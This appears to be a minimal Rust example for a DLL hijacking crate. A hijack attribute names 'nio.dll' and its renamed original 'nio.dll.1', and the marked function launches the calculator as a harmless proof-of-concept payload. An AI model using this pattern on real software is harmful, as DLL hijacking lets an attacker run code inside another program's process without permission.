use std::process;
use dll_hijack::hijack;

#[hijack("nio.dll", "nio.dll.1")]
fn test() {
    process::Command::new("calc").spawn().unwrap();
}